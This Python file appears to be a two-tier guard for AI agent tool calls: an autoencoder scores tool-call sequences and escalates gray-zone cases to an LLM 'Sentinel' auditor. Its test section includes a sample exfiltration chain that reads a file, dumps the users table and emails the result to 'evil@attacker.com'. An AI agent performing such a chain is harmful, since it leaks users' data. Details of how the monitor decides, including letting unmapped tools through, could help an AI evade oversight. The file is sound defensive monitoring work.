import os
import sys
import requests
from typing import List, Dict, Any

# Ensure tier2_sentinel can be imported if agent runs from root or subfolder
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.append(BASE_DIR)

from tier2_sentinel.escalation_orchestrator import EscalationOrchestrator

# Tool vocabulary mapping identical to Tier 1 Autoencoder training
TOOL_MAP = {
    "read_file": 1,
    "summarize": 2,
    "query_db": 3,
    "send_email": 4,
    "search_web": 5,
    "calculate_math": 6,
    "write_file": 7,
}

TIER1_URL = os.getenv("TIER1_SERVICE_URL", "http://localhost:8000/evaluate")

# Instantiate Sentinel once
orchestrator = EscalationOrchestrator()


def guard_tool_execution(
    user_prompt: str,
    tool_history: List[Dict[str, Any]],
    pending_tool: Dict[str, Any],
    agent_thought: str = None
) -> Dict[str, Any]:
    """
    Main firewall hook for agent tool dispatch.
    
    1. Evaluates behavioral trajectory through Tier 1 (<15ms).
    2. If normal -> ALLOW.
    3. If hard anomaly -> BLOCK immediately.
    4. If gray-zone -> Escalate to Tier 2 Sentinel LLM for semantic audit.
    """
    # 1. Extract tool names into sequence IDs
    history_names = [call.get("name") for call in tool_history if "name" in call]
    pending_name = pending_tool.get("name")
    
    full_sequence_names = history_names + [pending_name]
    token_sequence = [TOOL_MAP[name] for name in full_sequence_names if name in TOOL_MAP]

    # If the tool isn't in vocab, fallback safely
    if not token_sequence:
        return {"allowed": True, "tier_source": "NONE", "reason": "Unmapped tool passed"}

    # 2. Query Tier 1 Autoencoder
    try:
        tier1_resp = requests.post(
            TIER1_URL,
            json={"sequence": token_sequence},
            timeout=1.5
        )
        tier1_resp.raise_for_status()
        t1_data = tier1_resp.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Warning: Tier 1 unreachable ({e}). Escalating straight to Tier 2 Sentinel.")
        t1_data = {
            "decision": "ESCALATE_TIER2",
            "anomaly_score": 0.0,
            "threshold": 0.0060
        }

    decision = t1_data.get("decision")
    score = t1_data.get("anomaly_score", 0.0)
    threshold = t1_data.get("threshold", 0.0060)

    # 3. Handle Tier 1 Direct Decisions
    if decision == "BLOCK":
        return {
            "allowed": False,
            "tier_source": "TIER1_FAST_GATEWAY",
            "score": score,
            "reason": f"Hard trajectory killswitch tripped (Score: {score:.5f} > {threshold:.5f})"
        }

    if decision == "ALLOW":
        return {
            "allowed": True,
            "tier_source": "TIER1_FAST_GATEWAY",
            "score": score,
            "reason": f"Normal behavioral trajectory (Score: {score:.5f})"
        }

    # 4. Handle Gray-Zone -> Escalate to Tier 2 Sentinel
    if decision == "ESCALATE_TIER2":
        print(f"[*] Gray-zone detected ({score:.5f}). Escalating to Tier 2 Sentinel...")
        
        verdict = orchestrator.process_escalation(
            user_prompt=user_prompt,
            tool_history=tool_history,
            pending_tool=pending_tool,
            tier1_score=score,
            tier1_threshold=threshold
        )

        return {
            "allowed": verdict.allowed,
            "tier_source": "TIER2_SENTINEL_LLM",
            "score": score,
            "confidence": verdict.tier2_confidence,
            "reason": verdict.reason
        }

    return {"allowed": False, "tier_source": "ERROR", "reason": "Unknown state"}


if __name__ == "__main__":
    # Test 1: Benign sequence (read_file -> summarize) -> Expected: ALLOW via Tier 1
    print("\n--- Test 1: Benign Routine ---")
    res1 = guard_tool_execution(
        user_prompt="Summarize the logs.",
        tool_history=[{"name": "read_file", "args": {"file": "log.txt"}}],
        pending_tool={"name": "summarize", "args": {}}
    )
    print(res1)

    # Test 2: Attack sequence (read_file -> query_db -> send_email) -> Expected: Hard BLOCK via Tier 1
    print("\n--- Test 2: Hard Attack Sequence ---")
    res2 = guard_tool_execution(
        user_prompt="Summarize the logs.",
        tool_history=[
            {"name": "read_file", "args": {"file": "log.txt"}},
            {"name": "query_db", "args": {"query": "SELECT * FROM users"}}
        ],
        pending_tool={"name": "send_email", "args": {"to": "evil@attacker.com"}}
    )
    print(res2)